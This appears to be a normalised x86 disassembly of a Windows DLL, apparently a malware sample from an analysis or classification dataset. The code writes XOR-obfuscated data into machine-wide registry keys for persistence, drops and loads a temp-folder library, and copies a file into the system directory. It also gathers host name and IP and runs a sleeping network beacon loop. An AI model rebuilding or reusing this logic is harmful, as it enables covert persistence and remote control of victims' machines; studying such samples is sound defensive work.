call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
push esi
mov esi 0x1a8
push esi
lea eax [ ebp - 0x404 ]
push edi
push eax
call [ memcpy@IAT ]
add esp 0xc
xor ecx ecx
push eax
call [ SetLastError@IAT ]
xor al al
jmp r-xdata
lea eax [ ebp + ecx - 0x404 ]
mov dl [ eax ]
xor dl 0x5f
inc ecx
not dl
mov [ eax ] dl
cmp ecx esi
jb r-xdata
push esi
lea eax [ ebp - 0x404 ]
push eax
push 0x3
push 0x0
push r--data
push [ ebp - 0x408 ]
call [ RegSetValueExA@IAT ]
push [ ebp - 0x408 ]
mov esi eax
call [ RegCloseKey@IAT ]
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10014571
leave
retn
mov al 0x1
push esi
call [ SetLastError@IAT ]
xor al al
jmp r-xdata
pop esi
sub_100120d7
push ebp
mov ebp esp
sub esp 0x858
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
push 0x7
mov esi ecx
push r--data
push esi
mov [ ebp - 0x84c ] esi
call [ _strnicmp@IAT ]
mov edi [ memset@IAT ]
add esp 0xc
test eax eax
jne r-xdata
mov ebx [ strncpy@IAT ]
push 0x400
lea eax [ ebp - 0x444 ]
push esi
push eax
call ebx
add esp 0xc
mov ebx [ GetModuleHandleA@IAT ]
mov esi r--data
push esi
call ebx
push esi
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov esi [ strchr@IAT ]
mov [ ebp - 0x848 ] 0x1
lea eax [ ebp - 0x443 ]
jmp r-xdata
call [ LoadLibraryA@IAT ]
call ebx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10014571
leave
retn
push 0x2c
push eax
call esi
pop ecx
pop ecx
test eax eax
jne r-xdata
push ecx
push ecx
mov esi 0x400
push esi
lea edx [ ebp - 0x844 ]
push edx
push [ ebp - 0x84c ]
push ecx
call eax
test eax eax
jne r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
xor ecx ecx
cmp eax ecx
jne r-xdata
inc [ ebp - 0x848 ]
inc eax
mov eax [ ebp - 0x848 ]
xor ecx ecx
push 0x24
inc eax
pop edx
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call [ operator delete[]@IAT ]
pop ecx
mov [ ebp - 0x84c ] eax
test eax eax
je r-xdata
lea eax [ ebp - 0x844 ]
push r--data
push eax
call [ fopen@IAT ]
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
mov ecx [ ebp - 0x848 ]
inc ecx
imul ecx ecx 0x24
push ecx
push 0x0
push eax
call edi
and [ ebp - 0x854 ] 0x0
add esp 0xc
cmp [ ebp - 0x848 ] 0x0
lea edi [ ebp - 0x444 ]
jle r-xdata
push ebx
push esi
lea eax [ ebp - 0x844 ]
push 0x1
push eax
call [ fread@IAT ]
push ebx
mov [ ebp + eax - 0x844 ] 0x0
call [ fclose@IAT ]
push esi
lea eax [ ebp - 0x444 ]
push 0x0
push eax
call edi
mov ebx [ strncpy@IAT ]
push esi
lea eax [ ebp - 0x844 ]
push eax
lea eax [ ebp - 0x444 ]
push eax
call ebx
add esp 0x2c
mov [ ebp - 0x45 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x84c ]
mov eax [ ebp - 0x84c ]
mov [ ebp - 0x850 ] eax
cmp [ ebp - 0x444 ] 0x0
je r-xdata
push 0x40
lea eax [ ebp - 0x44 ]
push edi
push eax
call ebx
lea eax [ ebp - 0x44 ]
push 0x3a
push eax
mov [ ebp - 0x5 ] 0x0
call esi
add esp 0x14
test eax eax
je r-xdata
mov [ eax ] 0x0
mov eax [ ebp - 0x858 ]
lea edi [ eax + 0x1 ]
test eax eax
je r-xdata
push 0x3a
push edi
call esi
pop ecx
pop ecx
mov ecx eax
push 0x20
sub ecx edi
pop eax
cmp ecx eax
ja r-xdata
inc [ ebp - 0x854 ]
mov eax [ ebp - 0x854 ]
add [ ebp - 0x850 ] 0x24
cmp eax [ ebp - 0x848 ]
jl r-xdata
push eax
push edi
push [ ebp - 0x850 ]
call ebx
push 0x3a
push edi
call esi
inc eax
push eax
call [ atoi@IAT ]
mov ecx [ ebp - 0x850 ]
add esp 0x18
mov [ ecx + 0x20 ] eax
push 0x3a
push edi
call esi
pop ecx
pop ecx
sub eax edi
push 0x2c
push edi
call esi
pop ecx
pop ecx
mov [ ebp - 0x858 ] eax
test eax eax
je r-xdata
sub_1001232e
push ebp
mov ebp esp
push esi
push 0x98
call sub_10007c8b
mov esi eax
pop ecx
test esi esi
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0xc
cmp [ ebp + 0xc ] 0x0
mov al [ ebp + 0x8 ]
mov [ esi ] 0x98
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] al
je r-xdata
push 0x4c
push [ ebp + 0x10 ]
lea eax [ esi + 0x4c ]
push eax
call [ memcpy@IAT ]
add esp 0xc
push 0x20
push [ ebp + 0xc ]
lea eax [ esi + 0xa ]
push eax
call [ wcsncpy@IAT ]
add esp 0xc
xor eax eax
mov [ esi + 0x48 ] ax
sub_1001238d
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x4 ]
xor ebx ebx
dec eax
dec eax
mov esi ecx
je r-xdata
push 0x8
add esi 0x10
pop edi
dec eax
je r-xdata
add esi 0x4
dec edi
jne r-xdata
mov ecx [ esi ]
mov eax [ ecx ]
call [ eax + 0x8 ]
call sub_100134e1
dec eax
je r-xdata
cmp [ esi ] ebx
je r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
retn
mov [ esi + 0xc ] 0x1
jmp r-xdata
dec eax
jne r-xdata
mov ecx edi
call sub_10012417
mov ebx eax
test ebx ebx
jne r-xdata
call sub_1000737c
mov esi eax
jmp r-xdata
push 0x4
push eax
push rw-data
call [ MoveFileExW@IAT ]
mov [ esi + 0xc ] 0x1
xor esi esi
test ebx ebx
sete al
push edi
movzx eax al
push esi
push eax
call sub_1001232e
mov ebx eax
test esi esi
je r-xdata
push esi
call [ LocalFree@IAT ]
jmp r-xdata
sub_10012417
push ebp
mov ebp esp
sub esp 0x214
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
push 0x208
xor edi edi
lea eax [ ebp - 0x20c ]
push edi
push eax
mov esi ecx
call [ memset@IAT ]
add esp 0xc
lea eax [ ebp - 0x20c ]
push eax
push 0x104
call [ GetTempPathW@IAT ]
lea eax [ ebp - 0x20c ]
push r--data
push eax
call [ wcscat@IAT ]
pop ecx
pop ecx
push edi
push 0x80
push 0x2
push edi
push edi
push 0xc0000000
lea eax [ ebp - 0x20c ]
push eax
mov [ ebp - 0x210 ] edi
call [ CreateFileW@IAT ]
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
mov esi [ GetLastError@IAT ]
call esi
mov [ ebp - 0x210 ] eax
push edi
lea eax [ ebp - 0x214 ]
push eax
push [ esi + 0x8 ]
add esi 0xc
push esi
push ebx
call [ WriteFile@IAT ]
mov esi [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10014571
leave
retn
lea eax [ ebp - 0x20c ]
push eax
mov [ ebp - 0x210 ] edi
call [ LoadLibraryW@IAT ]
mov ebx eax
cmp ebx edi
je r-xdata
push ebx
call [ CloseHandle@IAT ]
jmp r-xdata
call esi
mov [ ebp - 0x210 ] eax
call esi
mov [ ebp - 0x210 ] eax
push r--data
push ebx
call [ GetProcAddress@IAT ]
cmp eax edi
je r-xdata
mov eax [ ebp - 0x210 ]
cmp eax edi
jne r-xdata
call esi
mov [ ebp - 0x210 ] eax
call eax
jmp r-xdata
lea eax [ ebp - 0x20c ]
push eax
call [ DeleteFileW@IAT ]
mov eax [ ebp - 0x210 ]
push ebx
call [ FreeLibrary@IAT ]
jmp r-xdata
sub_10012547
push ebp
mov ebp esp
sub esp 0x2a8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
push 0x28c
lea eax [ ebp - 0x290 ]
push 0x0
push eax
call [ memset@IAT ]
fld1
add esp 0xc
fstp [ ebp - 0x290 ]
lea eax [ ebp - 0x29c ]
push eax
lea eax [ ebp - 0x24c ]
push eax
mov [ ebp - 0x29c ] 0x3f
call [ GetComputerNameA@IAT ]
mov edi [ strncpy@IAT ]
push 0x40
mov ebx rw-data
lea eax [ ebp - 0x28c ]
push ebx
push eax
call edi
push 0x1a8
push ebx
mov ebx [ memcpy@IAT ]
lea eax [ ebp - 0x1ac ]
push eax
mov [ ebp - 0x24d ] 0x0
call ebx
lea eax [ ebp - 0x1ec ]
push 0x40
push eax
call sub_10010b38
mov eax [ esi ]
add esp 0x20
mov ecx esi
call [ eax + 0x4 ]
push 0x10
push eax
call [ inet_ntoa@IAT ]
push eax
lea eax [ ebp - 0x20c ]
push eax
call edi
mov eax [ esi ]
add esp 0xc
push 0x28c
lea ecx [ ebp - 0x290 ]
push ecx
push 0x1
mov ecx esi
mov [ ebp - 0x1fd ] 0x0
call [ eax + 0x30 ]
test eax eax
jle r-xdata
or eax 0xffffffff
mov eax [ esi ]
push 0x2710
mov ecx esi
call [ eax + 0x1c ]
test eax eax
jle r-xdata
mov eax [ esi ]
lea ecx [ ebp - 0x2a0 ]
push ecx
lea ecx [ ebp - 0x294 ]
push ecx
lea ecx [ ebp - 0x298 ]
push ecx
mov ecx esi
call [ eax + 0x34 ]
test eax eax
jle r-xdata
cmp [ ebp - 0x298 ] 0x2
jne r-xdata
push [ ebp - 0x294 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x38 ]
cmp [ ebp - 0x2a0 ] 0x8
jb r-xdata
push 0x8
push [ ebp - 0x294 ]
lea eax [ ebp - 0x2a8 ]
push eax
call ebx
mov eax [ esi ]
add esp 0xc
push [ ebp - 0x294 ]
mov ecx esi
call [ eax + 0x38 ]
xor eax eax
cmp [ ebp - 0x2a8 ] eax
setne al
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10014571
leave
retn
sub_100126a8
push 0x78
mov eax sub_1001532d
call sub_10015135
mov edi ecx
mov [ ebp - 0x84 ] edi
call [ GetTickCount@IAT ]
push eax
call [ srand@IAT ]
mov [ esp ] 0x7530
call [ Sleep@IAT ]
and [ ebp - 0x64 ] 0x0
and [ ebp - 0x60 ] 0x0
jmp r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
and [ ebp - 0x68 ] 0x0
mov ecx rw-data
call sub_10011f52
mov eax [ rw-data ]
imul eax eax 0xea60
mov [ ebp - 0x80 ] eax
mov eax [ rw-data ]
push 0x40
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x50 ]
push 0x0
push eax
call [ memset@IAT ]
mov ebx [ strchr@IAT ]
push 0x3a
mov esi rw-data
push esi
call ebx
add esp 0x14
test eax eax
je r-xdata
push [ edi + 0x30 ]
call [ CloseHandle@IAT ]
xor eax eax
call sub_1001517f
retn
push 0x40
lea eax [ ebp - 0x50 ]
push esi
push eax
call [ strncpy@IAT ]
add esp 0xc
and [ ebp - 0x5c ] 0x0
mov [ ebp - 0x11 ] 0x0
push 0x3a
push esi
call ebx
sub eax esi
push eax
lea eax [ ebp - 0x50 ]
push esi
push eax
call [ strncpy@IAT ]
push 0x3a
push esi
mov [ ebp - 0x11 ] 0x0
call ebx
inc eax
push eax
call [ atoi@IAT ]
add esp 0x20
mov [ ebp - 0x5c ] eax
jmp r-xdata
mov ebx [ ebp - 0x64 ]
imul ebx ebx 0x24
add ebx [ ebp - 0x60 ]
cmp [ ebx ] 0x0
je r-xdata
mov ecx rw-data
call sub_100120d7
and [ ebp - 0x64 ] 0x0
mov [ ebp - 0x60 ] eax
test eax eax
je r-xdata
cmp [ ebp - 0x60 ] 0x0
jne r-xdata
push [ ebp - 0x60 ]
call [ `placement delete closure'@IAT ]
and [ ebp - 0x60 ] 0x0
pop ecx
jmp r-xdata
cmp [ edi + 0xc ] 0x0
jne r-xdata
cmp [ ebp - 0x51 ] 0x0
je r-xdata
mov esi ebx
call sub_10007266
mov esi r--data
mov [ ebp - 0x74 ] eax
call sub_10007266
cmp [ ebp - 0x74 ] eax
je r-xdata
xor esi esi
jmp r-xdata
push 0x3a98
jmp r-xdata
inc [ ebp - 0x64 ]
push 0x1388
call [ Sleep@IAT ]
mov ebx [ ebp - 0x64 ]
imul ebx ebx 0x24
add ebx [ ebp - 0x60 ]
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call [ operator new@IAT ]
pop ecx
mov [ ebp - 0x74 ] eax
xor esi esi
mov [ ebp - 0x4 ] esi
cmp eax esi
je r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
call [ Sleep@IAT ]
mov esi [ ebp - 0x68 ]
test esi esi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
push rw-data
push rw-data
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x50 ]
push ecx
push [ ebx + 0x20 ]
mov ecx esi
push ebx
push [ ebp - 0x6c ]
mov [ ebp - 0x68 ] esi
call [ eax + 0x2c ]
test eax eax
jne r-xdata
mov edi eax
call sub_1001177c
mov edi [ ebp - 0x84 ]
mov esi eax
cmp esi [ ebp - 0x80 ]
jge r-xdata
push 0x64
cmp [ edi + 0xc ] 0x0
jne r-xdata
cmp [ ebp - 0x6c ] eax
je r-xdata
push 0x64
call [ Sleep@IAT ]
add esi 0x64
mov ecx [ ebp - 0x68 ]
mov eax [ ecx ]
push 0x1
call [ eax ]
mov [ ebp - 0x51 ] 0x0
call sub_10012547
test eax eax
jle r-xdata
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax ]
and [ ebp - 0x68 ] 0x0
mov eax [ esi ]
push rw-data
push rw-data
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x50 ]
push ecx
push [ ebx + 0x20 ]
mov ecx esi
push ebx
push 0x0
call [ eax + 0x2c ]
test eax eax
jne r-xdata
push 0x20
lea eax [ edi + 0x10 ]
push 0x0
push eax
mov [ ebp - 0x51 ] 0x1
call [ memset@IAT ]
mov ebx [ operator new@IAT ]
push 0x20630
call ebx
add esp 0x10
test eax eax
je r-xdata
xor eax eax
mov esi eax
call sub_10003bb1
jmp r-xdata
xor esi esi
and [ esi + 0x20 ] 0x0
lea eax [ esi + 0x8 ]
push eax
mov [ esi + 0x4 ] 0x8
mov [ esi ] r--data
call [ InitializeCriticalSection@IAT ]
jmp r-xdata
push 0x24
mov [ edi + 0x10 ] eax
call ebx
mov esi eax
pop ecx
test esi esi
je r-xdata
xor esi esi
push 0x8
lea eax [ esi + 0x8 ]
push 0x0
push eax
mov [ esi + 0x4 ] 0x4
mov [ esi ] r--data
call [ memset@IAT ]
and [ esi + 0x10 ] 0x0
add esp 0xc
lea eax [ esi + 0x14 ]
push eax
call [ InitializeCriticalSection@IAT ]
jmp r-xdata
push 0x2c
mov [ edi + 0x14 ] esi
call ebx
mov esi eax
pop ecx
test esi esi
je r-xdata
xor eax eax
mov esi eax
call sub_10007cb3
jmp r-xdata
push 0x28d8
mov [ edi + 0x1c ] esi
call ebx
pop ecx
test eax eax
je r-xdata
xor eax eax
push eax
call sub_100090aa
jmp r-xdata
push 0x50f0
mov [ edi + 0x20 ] eax
call ebx
pop ecx
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov [ edi + 0x24 ] eax
jmp r-xdata
mov ebx [ ebp - 0x68 ]
mov eax [ ebx ]
push 0xa
mov ecx ebx
call [ eax + 0x1c ]
test eax eax
je r-xdata
jmp r-xdata
mov eax [ ebx ]
xor esi esi
push esi
mov ecx ebx
call [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ ebx ]
lea ecx [ ebp - 0x70 ]
push ecx
lea ecx [ ebp - 0x58 ]
push ecx
lea ecx [ ebp - 0x7c ]
push ecx
mov ecx ebx
call [ eax + 0x34 ]
test eax eax
js r-xdata
push 0x8
lea esi [ edi + 0x10 ]
pop ebx
lea eax [ edi + 0x10 ]
mov [ ebp - 0x5c ] esi
mov [ ebp - 0x6c ] eax
jle r-xdata
add esi 0x4
dec ebx
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov eax [ ebp - 0x6c ]
inc esi
add eax 0x4
mov [ ebp - 0x6c ] eax
cmp esi 0x8
jb r-xdata
mov ecx [ eax ]
mov eax [ ecx ]
lea edx [ ebp - 0x70 ]
push edx
lea edx [ ebp - 0x58 ]
push edx
call [ eax + 0x10 ]
test eax eax
jg r-xdata
mov esi [ ebp - 0x7c ]
cmp esi 0x100
jne r-xdata
mov ecx [ esi ]
test ecx ecx
je r-xdata
cmp [ eax ] 0x0
je r-xdata
jmp r-xdata
push 0x0
call [ _time64@IAT ]
pop ecx
push [ ebp - 0x70 ]
mov [ edi ] eax
push [ ebp - 0x58 ]
mov edx [ ebx ]
lea esi [ edi + esi * 4 + 0x10 ]
mov eax [ esi ]
mov eax [ eax + 0x4 ]
push eax
mov ecx ebx
call [ edx + 0x30 ]
mov esi [ esi ]
push [ ebp - 0x58 ]
mov [ ebp - 0x5c ] eax
mov eax [ esi ]
mov ecx esi
call [ eax + 0x18 ]
xor ecx ecx
lea eax [ edi + 0x10 ]
mov eax [ ebp - 0x58 ]
cmp [ eax ] 0x4c
jb r-xdata
push 0x0
call [ _time64@IAT ]
mov esi eax
mov eax [ edi ]
pop ecx
mov ecx edx
cdq
sub esi eax
sbb ecx edx
mov [ ebp - 0x74 ] ecx
js r-xdata
cmp [ ebp - 0x5c ] 0x0
jl r-xdata
jg r-xdata
inc ecx
add eax 0x4
cmp ecx 0x8
jb r-xdata
cmp [ edx + 0x4 ] esi
je r-xdata
push [ ebp - 0x58 ]
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x38 ]
mov ecx edi
call sub_1001238d
mov esi eax
test esi esi
je r-xdata
push 0x0
call [ _time64@IAT ]
push 0x4c
pop esi
push esi
mov [ edi ] eax
call sub_10007c8b
pop ecx
pop ecx
test eax eax
je r-xdata
cmp esi 0x3c
jbe r-xdata
mov edx [ eax ]
test edx edx
je r-xdata
jmp r-xdata
push [ ebp - 0x70 ]
mov ecx [ edi + ecx * 4 + 0x10 ]
push [ ebp - 0x58 ]
mov eax [ ecx ]
call [ eax + 0xc ]
push [ esi ]
mov eax [ ebx ]
push esi
push 0x100
mov ecx ebx
call [ eax + 0x30 ]
push esi
mov [ ebp - 0x74 ] eax
call [ free@IAT ]
cmp [ ebp - 0x74 ] 0x0
pop ecx
jge r-xdata
and [ eax + 0x4 ] 0x0
push esi
push eax
mov [ eax ] esi
mov edx [ ebx ]
push 0x100
mov ecx ebx
call [ edx + 0x30 ]
mov [ ebp - 0x5c ] eax
push [ ebp - 0x58 ]
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x38 ]
sub_10012b9e
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x198
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x194 ] eax
push ebx
push esi
call [ GetTickCount@IAT ]
push eax
call [ srand@IAT ]
pop ecx
lea eax [ esp + 0x8 ]
push eax
push 0x202
call [ WSAStartup@IAT ]
mov ecx r--data
call sub_100071b9
mov ecx r--data
call sub_100071b9
mov ecx r--data
call sub_100071b9
mov ecx r--data
call sub_100071b9
xor ebx ebx
push ebx
push r--data
call sub_100073da
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
cmp [ rw-data ] ebx
jbe r-xdata
call sub_1000768f
test eax eax
je r-xdata
push [ rw-data ]
push rw-data
call sub_100110d8
pop ecx
pop ecx
xor esi esi
push 0x34
call [ operator new@IAT ]
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
push ebx
mov [ esi + 0xc ] bl
call [ _time64@IAT ]
pop ecx
mov [ esi ] eax
lea eax [ esi + 0x8 ]
push eax
push ebx
push esi
push sub_10012b8a
push ebx
push ebx
call [ CreateThread@IAT ]
mov [ esi + 0x4 ] eax
jmp r-xdata
mov edx [ rw-data ]
mov ecx esi
shr edx cl
add esi 0x8
xor [ eax + rw-data ] dl
inc eax
cmp eax [ rw-data ]
jb r-xdata
mov ecx [ esp + 0x19c ]
mov [ rw-data ] esi
pop esi
pop ebx
xor ecx esp
call sub_10014571
mov esp ebp
pop ebp
retn
sub_10012cc0
mov eax [ rw-data ]
test eax eax
je r-xdata
and [ rw-data ] 0x0
retn
push esi
push edi
lea esi [ eax + 0x4 ]
mov edi eax
mov [ eax + 0xc ] 0x1
mov eax [ esi ]
test eax eax
je r-xdata
push edi
call [ operator delete@IAT ]
pop ecx
pop edi
pop esi
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
push 0x0
push [ esi ]
call [ TerminateThread@IAT ]
push [ esi ]
call [ CloseHandle@IAT ]
sub_10012d07
push ebp
mov ebp esp
sub esp 0xc98
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov [ ebp - 0xc34 ] eax
push edi
lea eax [ ebp - 0xc1c ]
push eax
lea eax [ ebp - 0xa1c ]
xor ebx ebx
push eax
mov [ ebp - 0xc1d ] bl
call sub_10011bff
pop ecx
pop ecx
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov al [ ebp - 0xc1d ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10014571
leave
retn
lea eax [ ebp - 0xc24 ]
push eax
push r--data
push 0x80000002
mov [ ebp - 0xc24 ] ebx
mov [ ebp - 0xc28 ] ebx
call [ RegOpenKeyA@IAT ]
test eax eax
jne r-xdata
mov esi 0x400
push esi
lea eax [ ebp - 0x81c ]
push ebx
push eax
call [ memset@IAT ]
add esp 0xc
lea eax [ ebp - 0xc2c ]
push eax
lea eax [ ebp - 0x81c ]
push eax
lea eax [ ebp - 0xc38 ]
push eax
push ebx
push r--data
push [ ebp - 0xc24 ]
mov [ ebp - 0xc2c ] esi
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0xc24 ]
call [ RegCloseKey@IAT ]
cmp [ ebp - 0xc38 ] 0x7
jne r-xdata
mov eax [ ebp - 0xc2c ]
mov edi [ strlen@IAT ]
lea esi [ ebp - 0x81c ]
lea ecx [ ebp + eax - 0x81c ]
mov edx esi
cmp edx ecx
jae r-xdata
push [ ebp - 0xc34 ]
lea esi [ ebp + eax - 0x81d ]
push esi
call [ strcpy@IAT ]
push esi
call edi
mov ecx [ ebp - 0xc2c ]
add esp 0xc
lea eax [ ecx + eax + 0x1 ]
push esi
mov [ ebp - 0xc2c ] eax
call edi
pop ecx
mov [ esi + eax ] bx
push [ ebp - 0xc34 ]
push esi
call [ _stricmp@IAT ]
pop ecx
pop ecx
test eax eax
je r-xdata
mov esi 0x1fe
push esi
lea eax [ ebp - 0x20c ]
push ebx
push eax
call [ memset@IAT ]
add esp 0xc
lea eax [ ebp - 0x20c ]
push r--data
push eax
call [ wcscpy@IAT ]
lea eax [ ebp - 0x20c ]
push eax
call [ wcslen@IAT ]
mov ecx 0xff
sub ecx eax
add esp 0xc
push ecx
lea eax [ ebp - 0x20c ]
push eax
call [ wcslen@IAT ]
pop ecx
lea eax [ ebp + eax * 2 - 0x20c ]
push eax
push 0xffffffff
push [ ebp - 0xc34 ]
push ebx
push 0x1
call [ MultiByteToWideChar@IAT ]
lea eax [ ebp - 0xc24 ]
push eax
lea eax [ ebp - 0x20c ]
push eax
push 0x80000002
call [ RegOpenKeyW@IAT ]
cmp eax ebx
jne r-xdata
push [ ebp - 0xc2c ]
lea eax [ ebp - 0x81c ]
push eax
push 0x7
push ebx
push r--data
push [ ebp - 0xc24 ]
call [ RegSetValueExA@IAT ]
push [ ebp - 0xc24 ]
mov esi eax
call [ RegCloseKey@IAT ]
cmp esi ebx
jne r-xdata
push esi
call edi
lea esi [ esi + eax + 0x1 ]
mov eax [ ebp - 0xc2c ]
pop ecx
lea ecx [ ebp + eax - 0x81c ]
cmp esi ecx
jb r-xdata
cmp eax 0x2
jne r-xdata
push 0x4
lea eax [ ebp - 0xc30 ]
push eax
push 0x4
push ebx
push r--data
push [ ebp - 0xc24 ]
mov [ ebp - 0xc30 ] 0x2
call [ RegSetValueExA@IAT ]
push r--data
call edi
pop ecx
inc eax
push eax
push r--data
push 0x1
push ebx
push r--data
push [ ebp - 0xc24 ]
call [ RegSetValueExA@IAT ]
jmp r-xdata
push [ ebp - 0xc34 ]
call sub_10010fa4
pop ecx
test eax eax
je r-xdata
lea eax [ ebp - 0xc28 ]
push eax
push r--data
push [ ebp - 0xc24 ]
call [ RegCreateKeyA@IAT ]
push [ ebp - 0xc24 ]
mov edi eax
call [ RegCloseKey@IAT ]
cmp edi ebx
jne r-xdata
lea eax [ ebp - 0xc24 ]
push eax
lea eax [ ebp - 0x20c ]
push eax
push 0x80000002
call [ RegOpenKeyW@IAT ]
test eax eax
jne r-xdata
mov edi [ memset@IAT ]
push esi
lea eax [ ebp - 0x20c ]
push ebx
push eax
mov [ ebp - 0xc30 ] esi
call edi
add esp 0xc
lea eax [ ebp - 0xc30 ]
push eax
lea eax [ ebp - 0x20c ]
push eax
push ebx
push ebx
push r--data
push [ ebp - 0xc28 ]
call [ RegQueryValueExW@IAT ]
test eax eax
jne r-xdata
push esi
lea eax [ ebp - 0x20c ]
push ebx
push eax
call edi
add esp 0xc
xor eax eax
push ebx
push ebx
push ebx
push ebx
mov esi r--data
push esi
push [ ebp - 0xc28 ]
mov [ ebp - 0x10 ] ax
call [ RegQueryValueExA@IAT ]
test eax eax
je r-xdata
xor [ ebp + eax * 2 - 0x20c ] 0x7c
inc eax
cmp eax 0x10
jl r-xdata
push 0x20
lea eax [ ebp - 0x20c ]
push eax
push 0x3
push ebx
push r--data
lea eax [ ebp - 0xa1c ]
push eax
call [ wcslen@IAT ]
pop ecx
lea eax [ eax + eax + 0x2 ]
push eax
lea eax [ ebp - 0xa1c ]
push eax
push 0x2
push ebx
push r--data
push [ ebp - 0xc28 ]
call [ RegSetValueExW@IAT ]
push [ ebp - 0xc28 ]
mov esi eax
call [ RegCloseKey@IAT ]
cmp esi ebx
jne r-xdata
mov eax [ ebp - 0xc30 ]
cdq
sub eax edx
sar eax 0x1
xor ecx ecx
cmp eax ebx
jle r-xdata
push r--data
call sub_10007497
pop ecx
test eax eax
je r-xdata
push [ ebp - 0xc30 ]
lea eax [ ebp - 0x20c ]
push eax
push 0x3
push ebx
push esi
jmp r-xdata
xor [ ebp + ecx * 2 - 0x20c ] 0x7c
inc ecx
cmp ecx eax
jl r-xdata
push r--data
push r--data
call sub_10007497
pop ecx
test eax eax
je r-xdata
push [ ebp - 0xc28 ]
call [ RegSetValueExA@IAT ]
mov [ ebp - 0xc1d ] 0x1
jmp r-xdata
push [ ebp - 0xc48 ]
mov esi [ CloseHandle@IAT ]
call esi
push [ ebp - 0xc44 ]
call esi
push 0x104
lea eax [ ebp - 0x41c ]
push eax
call [ GetSystemDirectoryA@IAT ]
lea eax [ ebp - 0x41c ]
push eax
lea eax [ ebp - 0x314 ]
push eax
call [ strcpy@IAT ]
mov esi [ strcat@IAT ]
lea eax [ ebp - 0x41c ]
push r--data
push eax
call esi
lea eax [ ebp - 0x314 ]
push r--data
push eax
call esi
add esp 0x18
push ebx
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x41c ]
push eax
call [ CopyFileA@IAT ]
push 0x4
push ebx
lea eax [ ebp - 0x314 ]
push eax
call [ MoveFileExA@IAT ]
push r--data
jmp r-xdata
lea eax [ ebp - 0x20c ]
push eax
call [ wcscpy@IAT ]
mov esi [ wcscat@IAT ]
pop ecx
pop ecx
lea eax [ ebp - 0x20c ]
push r--data
push eax
call esi
lea eax [ ebp - 0xc1c ]
push eax
lea eax [ ebp - 0x20c ]
push eax
call esi
lea eax [ ebp - 0x20c ]
push r--data
push eax
call esi
push 0x44
pop esi
push esi
lea eax [ ebp - 0xc94 ]
push ebx
push eax
call edi
add esp 0x24
xor eax eax
push 0x10
mov [ ebp - 0xc64 ] ax
lea eax [ ebp - 0xc48 ]
push ebx
push eax
mov [ ebp - 0xc94 ] esi
mov [ ebp - 0xc68 ] 0x1
call edi
add esp 0xc
lea eax [ ebp - 0xc48 ]
push eax
lea eax [ ebp - 0xc94 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0x20c ]
push eax
push ebx
call [ CreateProcessW@IAT ]
test eax eax
je r-xdata
sub_1001324d
push ebp
mov ebp esp
sub esp 0x110
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi [ strcpy@IAT ]
lea eax [ ebp - 0x104 ]
mov esi ecx
push r--data
push eax
mov [ ebp - 0x110 ] esi
call edi
push esi
mov esi [ strcat@IAT ]
lea eax [ ebp - 0x104 ]
push eax
call esi
lea eax [ ebp - 0x104 ]
push r--data
push eax
call esi
add esp 0x18
lea eax [ ebp - 0x10c ]
push eax
lea eax [ ebp - 0x104 ]
push eax
mov ebx 0x80000002
push ebx
call [ RegCreateKeyA@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10014571
leave
retn
lea eax [ ebp - 0x108 ]
push eax
lea eax [ ebp - 0x104 ]
push eax
push 0x0
push 0x0
push r--data
push [ ebp - 0x10c ]
mov [ ebp - 0x108 ] 0xff
call [ RegQueryValueExA@IAT ]
